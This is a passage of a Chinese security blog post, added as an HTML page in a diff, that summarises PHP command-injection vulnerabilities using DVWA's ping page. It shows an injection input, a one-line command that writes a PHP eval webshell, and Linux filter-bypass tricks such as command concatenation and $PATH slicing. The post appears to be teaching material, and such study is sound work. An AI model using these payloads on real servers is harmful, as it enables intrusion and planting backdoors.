@@ -1,0 +1,1104 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="CNAQ">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00  原理什么是命令执行漏洞:通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。 在web应用中，有时候会用到一些命令执行的函数，如php中system()、exec()、shell_exec()等，当对用户输入的命令没有进行限制或者过滤不严导致用户可以执行任意命令时，就会造成命令执行漏洞。 php常见的命令执行函数:system()、exec()、shell_exec()">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令执行漏洞总结">
+<meta property="og:url" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="一只鲶鱼">
+<meta property="og:description" content="0x00  原理什么是命令执行漏洞:通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。 在web应用中，有时候会用到一些命令执行的函数，如php中system()、exec()、shell_exec()等，当对用户输入的命令没有进行限制或者过滤不严导致用户可以执行任意命令时，就会造成命令执行漏洞。 php常见的命令执行函数:system()、exec()、shell_exec()">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/001.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/002.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/003.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/004.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/005.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/006.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/007.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/008.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/009.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/010.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/011.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/012.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/013.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/014.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/015.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/016.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/017.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/018.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/019.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/020.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/021.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/022.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/023.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/024.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/025.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/026.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/027.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/028.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/029.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/030.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/031.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/032.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/033.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/034.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/035.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/036.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/037.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/038.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/039.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/040.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/041.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/042.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/043.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/044.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/045.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/046.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/047.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/048.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/049.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/050.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/051.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/052.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/053.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/054.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/055.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/056.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/057.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/058.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/059.png">
+<meta property="og:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/060.png">
+<meta property="article:published_time" content="2024-06-21T09:06:22.000Z">
+<meta property="article:modified_time" content="2024-06-20T09:24:08.361Z">
+<meta property="article:author" content="CNAQ">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/001.png">
+  
+  
+  
+  <title>命令执行漏洞总结 - 一只鲶鱼</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>一只鲶鱼</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="命令执行漏洞总结"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-06-21 17:06" pubdate>
+          2024年6月21日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          12 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">命令执行漏洞总结</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="0x00-原理"><a href="#0x00-原理" class="headerlink" title="0x00  原理"></a><strong>0x00  原理</strong></h2><p>什么是命令执行漏洞:通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。</p>
+<p>在web应用中，有时候会用到一些命令执行的函数，如php中system()、exec()、shell_exec()等，当对用户输入的命令没有进行限制或者过滤不严导致用户可以执行任意命令时，就会造成命令执行漏洞。</p>
+<p>php常见的命令执行函数:system()、exec()、shell_exec()、passthru()等。</p>
+<h2 id="0x01-实例"><a href="#0x01-实例" class="headerlink" title="0x01  实例"></a><strong>0x01  实例</strong></h2><p><strong>1.1  以dvwa为例:</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$target </span>= <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ];<br> <br>    <span class="hljs-comment">// Determine OS and execute the ping command.</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">stristr</span>( <span class="hljs-title function_ invoke__">php_uname</span>( <span class="hljs-string">&#x27;s&#x27;</span> ), <span class="hljs-string">&#x27;Windows NT&#x27;</span> ) ) &#123;<br>        <span class="hljs-comment">// Windows</span><br>        <span class="hljs-variable">$cmd </span>= <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">&#x27;ping  &#x27;</span> . <span class="hljs-variable">$target </span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// *nix</span><br>        <span class="hljs-variable">$cmd </span>= <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">&#x27;ping  -c 4 &#x27;</span> . <span class="hljs-variable">$target </span>);<br>    &#125;<br> <br>    <span class="hljs-comment">// Feedback for the end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br> <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>下面使用ping命令测试ip，正常输入一个ip或者域名会返回一个正常的返回结果。</p>
+<p>当输入恶意构造的语句“<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a> &amp;&amp; netstat -an”，后面的语句也会被执行。</p>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/001.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<h4 id="1-2-写入webshell"><a href="#1-2-写入webshell" class="headerlink" title="1.2  写入webshell:"></a><strong>1.2  写入webshell:</strong></h4><h5 id="（1）windows"><a href="#（1）windows" class="headerlink" title="（1）windows:"></a><strong>（1）windows:</strong></h5><p>用 ^ 转义:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> ^<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[pass]); ?^&gt; &gt; web目录/shell.php<br></code></pre></td></tr></table></figure>
+
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/002.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<p>单引号写不进去:</p>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/003.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<p>双引号会被一起写进去:</p>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/004.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<ol start="2">
+<li><h5 id="linux"><a href="#linux" class="headerlink" title="linux:"></a><strong>linux:</strong></h5>用单引号（双引号亦可）:</li>
+</ol>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/005.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<h2 id="0x02-绕过"><a href="#0x02-绕过" class="headerlink" title="0x02  绕过"></a><strong>0x02  绕过</strong></h2><p><strong>2.1  Linux:</strong></p>
+<h5 id="（1）常用符号"><a href="#（1）常用符号" class="headerlink" title="（1）常用符号:"></a><strong>（1）常用符号:</strong></h5><table>
+<thead>
+<tr>
+<th><strong>符号</strong></th>
+<th><strong>含义</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&amp;</td>
+<td>表示将任务置于后台执行。</td>
+</tr>
+<tr>
+<td>;</td>
+<td>多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块。</td>
+</tr>
+<tr>
+<td>&amp;&amp;</td>
+<td>只有在 &amp;&amp; 左边的命令返回真（返回0表示成功）, &amp;&amp;右边的命令才会被执行。</td>
+</tr>
+<tr>
+<td>||</td>
+<td>只有在 ||左边的命令返回假（返回1表示失败）, ||右边的命令才会被执行。</td>
+</tr>
+<tr>
+<td>|(管道符)</td>
+<td>|表示管道，上一条命令的输出，作为下一条命令的参数。</td>
+</tr>
+<tr>
+<td>%0a</td>
+<td>php环境。</td>
+</tr>
+<tr>
+<td>%0d</td>
+<td>php环境。</td>
+</tr>
+<tr>
+<td>&#96;&#96;</td>
+<td>反引号，跟在命令后，作为命令的参数。</td>
+</tr>
+<tr>
+<td>$( )</td>
+<td>跟在命令后，作为命令的参数。</td>
+</tr>
+</tbody></table>
+<p>&amp;</p>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/006.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<p>;</p>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/007.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<p>&amp;&amp;</p>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/008.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<p>||（前一条命令执行失败）</p>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/009.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<p>|</p>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/010.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<p>&#96;&#96;</p>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/011.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<p>$( )</p>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/012.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<h5 id="（2）命令拼接"><a href="#（2）命令拼接" class="headerlink" title="（2）命令拼接:"></a><strong>（2）命令拼接:</strong></h5><table>
+<thead>
+<tr>
+<th align="left">ping 127.0.0.1 -c 1;a&#x3D;who;b&#x3D;ami;$a$b</th>
+</tr>
+</thead>
+</table>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/013.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<h5 id="（3）环境变量"><a href="#（3）环境变量" class="headerlink" title="（3）环境变量:"></a>（3）<strong>环境变量:</strong></h5><table>
+<thead>
+<tr>
+<th align="left">echo ${PATH:起始位置:截取长度}</th>
+</tr>
+</thead>
+</table>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/014.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<p>执行命令:</p>
+<table>
+<thead>
+<tr>
+<th align="left">${PATH:5:1}${PATH:2:1}</th>
+</tr>
+</thead>
+</table>
